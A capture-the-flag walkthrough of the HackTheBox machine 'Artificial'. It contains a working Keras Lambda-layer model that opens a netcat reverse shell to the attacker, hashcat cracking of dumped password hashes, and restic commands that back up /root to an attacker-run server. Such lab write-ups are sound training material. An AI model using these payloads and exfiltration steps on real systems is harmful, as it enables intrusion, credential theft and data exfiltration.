---
title: HackTheBox -Artificial
author: Bonface
date: 2025-10-25 00:00:00 +0000
categories:
  - HackTheBox
  - Machines
tags:
  - HackTheBox
  - linux
  - nmap
  - web
  - fuzz
  - docker
  - tensorflow
  - deserialization
  - hashcat
  - port-forwarding
  - gtfobins
image:
  path: D:\myblog/assets/img/HTB/Machines/Artificial/Artificial.pngArtificial.png
  alt: Artificial.htb
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/1670709"></script> </div>

---

[Artificial](https://app.hackthebox.com/machines/668) is an easy linux machine on HTB Season 8.  

```
User: It is a simple model RCE, and then crack the password.
Root: Compress the package to get the password hash, forward the port after cracking, and back up /root to kali
```


# Port Scan
We start with a nmap scan to discover the open ports .  

```sh
nmap --min-rate 10000 -p- 10.129.34.132 -o nmap/fastscan

Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-24 16:04 EAT
Nmap scan report for 10.129.34.132
Host is up (7.9s latency).
Not shown: 63178 filtered tcp ports (no-response), 2355 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 33.85 seconds

------

nmap -Pn -sC -sV -A -p22,80 10.129.34.132 -o nmap/initialscan

Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-24 16:06 EAT
Nmap scan report for 10.129.34.132
Host is up.

PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp filtered http
Too many fingerprints match this host to give specific OS details

```

We keep getting filtered ports thus i concluded there might be a firewall in place thus i added the `-Pn` option to skip the initial ping and proceed directly to port scanning and the option `-sS` that sends ACK packets, you can see if the target responds with a RST packet, which indicates a closed port or if it's dropped, potentially indicating a filter.  


```sh
nmap -Pn -sS -sC -sV -A -p22,80 10.129.34.132 -o nmap/initialscan


PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```  


And with that we get the desired output.  
From the scan we are working on a linux machine hosting port 22 for ssh and a web server on port 80.  
The server redirects us to a domain `artificial.htb` that we can add to our `/etc/hosts` file.

# Web 
## Enumeration
We can do a quick directory fuzzing   

```sh
fuf -u http://artificial.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev'
________________________________________________

 :: Method           : GET
 :: URL              : http://artificial.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login                   [Status: 200, Size: 857, Words: 162, Lines: 29, Duration: 2280ms]
register                [Status: 200, Size: 952, Words: 182, Lines: 34, Duration: 2406ms]
logout                  [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 817ms]
dashboard               [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 2369ms]


```

With that we visit the site.  
The site :  

![](../assets/img/HTB/Machines/Artificial/Artificial.pngArtificial_website.png)

We get the page but since we don't have an account we cant do much.Let's create an account and login.  
We get to the `/dashboard`   

![](../assets/img/HTB/Machines/Artificial/Artificial.pngArtificial_dashboard.png)

On the dashboard we get that we can Upload, manage, and run our AI models here.  
Also we are given two files : a requirement file and a docker file .  

Requirements:   

```sh
cat requirements.txt 
tensorflow-cpu==2.13.1
```

The Dockerfile : 
```sh
cat Dockerfile 
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]


```

The Dockerfile sets up a Python 3.8 container and installs TensorFlow CPU version 2.13.1 from a wheel (`.whl`) file.  


## Exploitation
Did some research and got to this [article](https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model#detecting-a-malicious-lambda) which shows how to get RCE when a crafted malicious Tensorflow model is loaded.   

Lets craft our payload :  

The file :   

```python
import tensorflow as tf
import os

# Define the malicious function
def exploit(x):
    os.system("rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.16.15 7227 > /tmp/f")
    return x

# Wrap exploit in a Lambda layer
model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))

# Compile and save the model
model.compile()
model.save("exploit.h5")
```

The `Dockerfile`  

```sh
FROM python:3.8-slim

WORKDIR /app

# Install curl and dependencies
RUN apt-get update && \
    apt-get install -y curl && \
    rm -rf /var/lib/apt/lists/*

# Download the exact TensorFlow wheel from HTB environment
RUN curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

# Install TensorFlow
RUN pip install ./tensorflow_cpu-2.13.1-*.whl

# Add script
COPY pwn.py .

# Run the script
CMD ["python", "pwn.py"]

```

Then we build the Docker Image:  

```sh
docker build -t tf-revshell3 .
```


Run the Container to generate the `.h5` file inside Docker and get it on your host:  

```sh
docker run --rm -v "$PWD:/app" tf-revshell3
```


**Overview of what we just did...**  

We're embedding a **reverse shell payload** into a **TensorFlow/Keras model file (`.h5`)**. The idea is that when the server **loads your model**, the malicious code **executes automatically**, giving us a shell back.  

This is possible because Keras allows users to define **custom functions**, such as `Lambda` layers. These functions are serialized and deserialized using Python’s powerful (and dangerous) `eval()` mechanism.  


When a **target loads the model** with:  

```python
model = tf.keras.models.load_model('exploit.h5', compile=False)
```
  

Keras:  
- Deserializes the model
- Rebuilds the `Lambda` layer by **evaluating** the function string from the `.h5` file
- This evaluation **runs your exploit** function

Now we set up our netcat listener andd upload the file then wait for the target to load the model.  

```sh
nc -nlvp 7227
```


After uploading we do get a link where we can view predictions but to us this will just trigger the reverse shell.  

![](../assets/img/HTB/Machines/Artificial/Artificial.pngArtificial_revshell.png)



After visiting the link we do get a reverse shell.


# Lateral Movement
Since we are getting a unstable shell we stabilize it :   

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'

ctr +z 
stty raw -echo; fg

export TERM=xterm

```

Doing some enumeration we get :   
```sh
app@artificial:~/app$ whoami
app
app@artificial:~/app$ ls -la
total 36
drwxrwxr-x 7 app app 4096 Jun  9 13:56 .
drwxr-x--- 6 app app 4096 Jun  9 10:52 ..
-rw-rw-r-- 1 app app 7846 Jun  9 13:54 app.py
drwxr-xr-x 2 app app 4096 Jun 26 12:05 instance
drwxrwxr-x 2 app app 4096 Jun 26 12:10 models
drwxr-xr-x 2 app app 4096 Jun  9 13:55 __pycache__
drwxrwxr-x 4 app app 4096 Jun  9 13:57 static
drwxrwxr-x 2 app app 4096 Jun 18 13:21 templates
app@artificial:~/app$ ls instance
users.db
app@artificial:~/app$ cd instance
app@artificial:~/app/instance$ 

```

The first thing we get is that we are the user `app` then in the current directory we do have some files and directories.  
The file `app.py` must be the web application that we can do some source code review and get to understand more on how the web app was functioning but am most interested in the database file since we had the option of creating a user and logging in.  


To copy the file to my local machine for further analysis we can use python http server.

On the attack machine :   

```sh
app@artificial:~/app$ cd instance
app@artificial:~/app/instance$ python3 -m http.server 8080

```


Now on our machine :   

```sh
wget http://artificial.htb:8080/users.db 
--2025-06-26 15:23:17--  http://artificial.htb:8080/users.db
Resolving artificial.htb (artificial.htb)... 10.129.124.141
Connecting to artificial.htb (artificial.htb)|10.129.124.141|:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 24576 (24K) [application/octet-stream]
Saving to: ‘users.db’

users.db                                  100%[=====================================================================================>]  24.00K  16.2KB/s    in 1.5s    

2025-06-26 15:23:21 (16.2 KB/s) - ‘users.db’ saved [24576/24576]

file users.db 
users.db: SQLite 3.x database, last written using SQLite version 3031001, file counter 20, database pages 6, cookie 0x2, schema 4, UTF-8, version-valid-for 20


```

Since the file is a sqlite database we can read it using the command :   

```sh
sqlite3 users.db .dump
```

Here is the output :   

```sqlite
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE user (
	id INTEGER NOT NULL, 
	username VARCHAR(100) NOT NULL, 
	email VARCHAR(120) NOT NULL, 
	password VARCHAR(200) NOT NULL, 
	PRIMARY KEY (id), 
	UNIQUE (username), 
	UNIQUE (email)
);
INSERT INTO user VALUES(1,'gael','gael@artificial.htb','c99175974b6e192936d97224638a34f8');
INSERT INTO user VALUES(2,'mark','mark@artificial.htb','0f3d8c76530022670f1c6029eed09ccb');
INSERT INTO user VALUES(3,'robert','robert@artificial.htb','b606c5f5136170f15444251665638b36');
INSERT INTO user VALUES(4,'royer','royer@artificial.htb','bc25b1f80f544c0ab451c02a3dca9fc6');
INSERT INTO user VALUES(5,'mary','mary@artificial.htb','bf041041e57f1aff3be7ea1abd6129d0');
INSERT INTO user VALUES(6,'pentester','pentester@test.com','5f4dcc3b5aa765d61d8327deb882cf99');
CREATE TABLE model (
	id VARCHAR(36) NOT NULL, 
	filename VARCHAR(120) NOT NULL, 
	user_id INTEGER NOT NULL, 
	PRIMARY KEY (id), 
	FOREIGN KEY(user_id) REFERENCES user (id)
);
INSERT INTO model VALUES('4dfaaa5a-2bfe-4cff-92d5-ca7f45a063ec','4dfaaa5a-2bfe-4cff-92d5-ca7f45a063ec.h5',6);
COMMIT;

```

  
From this we do get some users and their passwords.To crack them i will use `hashcat` but before that will save the hashes on a file `hash.txt`  

```sh
awk -F "'" '{print $2":"$6}' dump > hash.txt

cat hash.txt 
gael:c99175974b6e192936d97224638a34f8
mark:0f3d8c76530022670f1c6029eed09ccb
robert:b606c5f5136170f15444251665638b36
royer:bc25b1f80f544c0ab451c02a3dca9fc6
mary:bf041041e57f1aff3be7ea1abd6129d0

```

Now we crack.  

```sh
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --username

hashcat -m 0 hash.txt --username --show
gael:c99175974b6e192936d97224638a34f8:mattp005numbertwo
royer:bc25b1f80f544c0ab451c02a3dca9fc6:marwinnarak043414036

```

we do get two users but reading the `/etc/passw` file we get the users who can spawn a shell   

```sh
app@artificial:~/app/instance$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
gael:x:1000:1000:gael:/home/gael:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash

```

# Privilege Escalation
we ssh as geal.  

```sh
ssh gael@artificial.htb
```

Doing some light enumeration :   

```sh
gael@artificial:~$ whoami
gael
gael@artificial:~$ id
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
gael@artificial:~$ 

```

The `id` command shows that the user is a member of the `sysadm` group.  
With this info lets use the `find` command to grab the files that belong or those that the `sysadm` has access to :  

```sh
gael@artificial:~$ find / -group sysadm -type f 2>/dev/null
/var/backups/backrest_backup.tar.gz

```

We use the same trick to copy the zip to our machine.  
Unzipping the file we get `backrest_backup` directory with this contents.  

```sh
 tree .
.
└── backrest
    ├── backrest
    ├── install.sh
    ├── jwt-secret
    ├── oplog.sqlite
    ├── oplog.sqlite-shm
    ├── oplog.sqlite-wal
    ├── oplog.sqlite.lock
    ├── processlogs
    │   └── backrest.log
    ├── restic
    └── tasklogs
        ├── logs.sqlite
        ├── logs.sqlite-shm
        └── logs.sqlite-wal

4 directories, 12 files

```

From the `install.sh` file we get :   

```sh
echo "Access backrest WebUI at http://localhost:9898
```

We go back to the machine and see if the port is listening.  

```sh
gael@artificial:/var/backups$ ss -tuln
Netid           State             Recv-Q            Send-Q                       Local Address:Port                       Peer Address:Port           Process           
udp             UNCONN            0                 0                            127.0.0.53%lo:53                              0.0.0.0:*                                
udp             UNCONN            0                 0                                  0.0.0.0:68                              0.0.0.0:*                                
tcp             LISTEN            0                 2048                             127.0.0.1:5000                            0.0.0.0:*                                
tcp             LISTEN            0                 4096                             127.0.0.1:9898                            0.0.0.0:*                                
tcp             LISTEN            0                 511                                0.0.0.0:80                              0.0.0.0:*                                
tcp             LISTEN            0                 4096                         127.0.0.53%lo:53                              0.0.0.0:*                                
tcp             LISTEN            0                 128                                0.0.0.0:22                              0.0.0.0:*                                
tcp             LISTEN            0                 511                                   [::]:80                                 [::]:*                                
tcp             LISTEN            0                 128                                   [::]:22                                 [::]:*         
```

Since the port is configure to listen locally we can do a port forwarding to access it on our machine.  

```sh
ssh gael@artificial.htb -L 9898:127.0.0.1:9898
```

Accessing the port  
![](../assets/img/HTB/Machines/Artificial/Artificial.pngArtificial_portforward.png)


To proceed we need valid credentials thus we go back to the backup file.
This time i did notice i had missed a hidden directory.  
```sh
ls -la
total 51060
drwxr-xr-x 5 sh3rl0ck sh3rl0ck     4096 Jun 26 16:34 .
drwxrwxr-x 3 sh3rl0ck sh3rl0ck     4096 Jun 26 16:29 ..
drwxr-xr-x 3 sh3rl0ck sh3rl0ck     4096 Mar  4 00:27 .config
-rwxr-xr-x 1 sh3rl0ck sh3rl0ck 25690264 Feb 16 22:38 backrest
-rwxr-xr-x 1 sh3rl0ck sh3rl0ck     3025 Mar  3 07:28 install.sh
-rw------- 1 sh3rl0ck sh3rl0ck       64 Mar  4 00:18 jwt-secret
-rw-r--r-- 1 sh3rl0ck sh3rl0ck    57344 Mar  5 01:13 oplog.sqlite
-rw------- 1 sh3rl0ck sh3rl0ck        0 Mar  4 00:18 oplog.sqlite.lock
drwxr-xr-x 2 sh3rl0ck sh3rl0ck     4096 Mar  4 00:18 processlogs
-rwxr-xr-x 1 sh3rl0ck sh3rl0ck 26501272 Mar  3 07:28 restic
drwxr-xr-x 3 sh3rl0ck sh3rl0ck     4096 Jun 26 16:48 tasklogs


ls .config/backrest/config.json
.config/backrest/config.json


```

Reading the file   
```json
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}

```

We get a username a bcrypt password, though the password is named bcrypt it looks like a base64 and also the format does bring some doubt thus i went and confirmed with hashcat examples :  

```sh
hashcat --example | grep bcrypt -A10
```

thus we base64 decode it  
```sh
echo -n "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP" | base64 -d
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO

```

Nice now we can try cracking it :   
```sh
hashcat -m 3200 backrest_hash /usr/share/wordlists/rockyou.txt

hashcat -m 3200 backrest_hash --show
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^

```

Now we have this creds :  

- Username : `backrest_root`
- Password : `!@#$%^`  

And boom we are logged in.  
![](../assets/img/HTB/Machines/Artificial/Artificial.pngArtificial_loggedin.png)


The overview part tells us we are working with `restic` an quick google search does land us to its github [repository](https://github.com/restic/restic) .  

```
restic is a backup program that is fast, efficient and secure.  

Rest Server is a high performance HTTP server that implements restic's REST backend API. It provides secure and efficient way to backup data remotely, using restic backup client via the rest: URL.  
```

![](../assets/img/HTB/Machines/Artificial/Artificial.pngArtificial_restic.png)  

Searching for ways to privesc using this program lands us to [gtfobins-restic](https://gtfobins.github.io/gtfobins/restic/)  

Here is the flow on how we can do a back up of the root directory.  

Creating a repo :   
![](../assets/img/HTB/Machines/Artificial/Artificial.pngArtificial_createRepo.png)  

We start by creating a server with a custom persistence directory and with authentication disabled on our attacker machine.  
```sh
rest-server --path /temp/backup --no-auth --listen :7223
```

Then on the victim we execute this commands.  
```sh
# init repository
-r rest:http://10.10.16.15:7223/myrepo init

# backup root 
-r rest:http://10.10.16.15:7223/myrepo backup /root

```

now we can view the snapshots backed up locally.  
```sh
restic -r /tmp/backup/myrepo snapshots
enter password for repository: 
repository 6f6d2d9d opened (version 2, compression level auto)
created new cache in /home/sh3rl0ck/.cache/restic
ID        Time                 Host        Tags        Paths  Size
-----------------------------------------------------------------------
5eb3d569  2025-06-26 18:16:50  artificial              /root  4.299 MiB
-----------------------------------------------------------------------
1 snapshots

```

We recover the snapshot using the id  
```sh
restic -r /tmp/backup/myrepo restore 5eb3d569 --target /home/sh3rl0ck/Practice/HTB/Machines/HTB_Artificial/getroot
enter password for repository: 
repository 6f6d2d9d opened (version 2, compression level auto)
[0:00] 100.00%  1 / 1 index files loaded
restoring snapshot 5eb3d569 of [/root] at 2025-06-26 15:16:50.317712287 +0000 UTC by root@artificial to /home/sh3rl0ck/Practice/HTB/Machines/HTB_Artificial/getroot
Summary: Restored 80 files/dirs (4.299 MiB) in 0:00


```

With the back up for the root directory we can go to `.ssh` directory and ssh in using the `id_rsa` file.  
```sh
ssh -i id_rsa root@artificial.htb
```

And that's it for the box :)  

![](../assets/img/HTB/Machines/Artificial/Artificial.pngArtificial_Pwn3d.png)
